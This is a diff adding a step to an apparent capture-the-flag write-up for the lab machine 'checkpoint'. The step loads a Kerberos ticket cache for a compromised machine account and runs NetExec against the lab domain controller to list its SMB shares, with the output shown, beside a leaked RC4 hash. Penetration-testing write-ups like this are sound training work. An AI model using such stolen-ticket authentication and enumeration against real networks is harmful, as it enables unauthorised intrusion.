@@ -1262,6 +1262,28 @@ RC4: e16081eb077aca74bdbf8af12af43ac9
 
 ```
 
+``` bash
+
+❯ export KRB5CCNAME=svc_pwned_CQ.ccache
+
+❯ nxc smb dc01.checkpoint.htb -k --use-kcache --shares
+
+SMB         dc01.checkpoint.htb 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
+SMB         dc01.checkpoint.htb 445    DC01             [+] checkpoint.htb\svc_pwned$ from ccache
+SMB         dc01.checkpoint.htb 445    DC01             [*] Enumerated shares
+SMB         dc01.checkpoint.htb 445    DC01             Share           Permissions     Remark
+SMB         dc01.checkpoint.htb 445    DC01             -----           -----------     ------
+SMB         dc01.checkpoint.htb 445    DC01             ADMIN$                          Remote Admin
+SMB         dc01.checkpoint.htb 445    DC01             C$                              Default share
+SMB         dc01.checkpoint.htb 445    DC01             DevDrop                         VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
+SMB         dc01.checkpoint.htb 445    DC01             IPC$            READ            Remote IPC
+SMB         dc01.checkpoint.htb 445    DC01             NETLOGON        READ            Logon server share
+SMB         dc01.checkpoint.htb 445    DC01             SYSVOL          READ            Logon server share
+SMB         dc01.checkpoint.htb 445    DC01             VMBackups       READ
+╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                            ✔ │ 4s ─╮
+╰─                                                                                                               ─╯
+
+```
 
 
 
